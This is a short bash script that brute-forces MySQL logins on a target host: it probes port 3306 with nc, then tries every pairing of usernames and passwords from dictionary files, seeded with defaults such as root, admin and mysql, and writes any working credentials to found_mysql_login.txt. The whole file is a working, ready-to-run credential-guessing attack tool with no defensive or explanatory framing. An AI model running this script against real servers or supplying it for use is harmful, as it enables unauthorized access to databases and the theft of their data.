#!/bin/bash


HOSTNAME="$1"
TIMEOUT="$2"
dicpass="./txt/mysql-pass.dic"
dicuser="./txt/mysql-user.dic"

if [[ ! -f "$dicuser" ]]; then
    echo "root" > "$dicuser"
fi

if [[ ! -f "$dicpass" ]]; then
    echo "root" > "$dicpass"
    echo "admin" >> "$dicpass"
    echo "su" >> "$dicpass"
    echo "mysql" >> "$dicpass"
fi

echo "try: mysql://$HOSTNAME:3306"
if ! nc -vz -w $TIMEOUT $HOSTNAME 3306; then
    echo "mysql://$HOSTNAME offline"
    exit
else
    echo "[found] mysql://$HOSTNAME" |grep --color ".*"
    echo "$HOSTNAME:3306" >> found_mysql.txt
fi

cat "$dicuser" | while read user
do
    user=$(echo "$user" |tr -d "\n")
    user=$(echo "$user" |xargs)
    if [ -z "$user" ]; then
       continue
    fi
    
    cat "$dicpass" | while read passwd
    do
        passwd=$(echo "$passwd" |tr -d "\n")
        passwd=$(echo "$passwd" |xargs)
        if [ -z "$passwd" ]; then
           continue
        fi
        echo "try: mysql://${user}:${passwd}@${HOSTNAME}"
        
        if mysql --connect-timeout=${TIMEOUT} -h"${HOSTNAME}" -u"${user}" -p"${passwd}" -e "show databases"; then
           echo "[found] mysql://${user}:${passwd}@${HOSTNAME}"
           echo "${user}:${passwd}@${HOSTNAME}" >> "found_mysql_login.txt"
        fi
       
    done
done

